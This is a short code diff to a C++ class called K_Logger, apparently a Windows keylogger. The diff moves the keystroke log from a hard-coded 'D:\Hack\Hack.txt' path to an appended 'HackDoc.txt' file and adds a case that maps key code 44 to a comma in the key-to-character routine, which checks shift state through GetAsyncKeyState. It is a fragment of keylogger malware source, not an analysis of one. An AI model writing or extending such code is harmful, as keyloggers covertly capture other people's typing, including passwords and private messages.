@@ -21,15 +21,15 @@ using std::cout;
 void K_Logger::WriteToDoc(LPCSTR text)
 {
 	std::ofstream doc_to;
-	LPCSTR fileName = "D:\\Hack";
-	LPCSTR fileNameTo = "D:\\Hack\\Hack.txt";
+	// LPCSTR fileName = "D:\\Hack";
+	// LPCSTR fileNameTo = "D:\\Hack\\Hack.txt";
 	
 
 	/*if (CreateDirectory(fileName, NULL))
 	{
 		if (CreateFile(fileNameTo, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL))
 		{*/
-			doc_to.open(fileNameTo, fstream::app);
+			doc_to.open("HackDoc.txt", fstream::app);
 			doc_to << text;
 			doc_to.close();	
 	/*	}
@@ -40,6 +40,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 {
 	switch (iKey)
 	{
+	case 44:
+		cout << ",";
+		break;
+
 	case 48:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
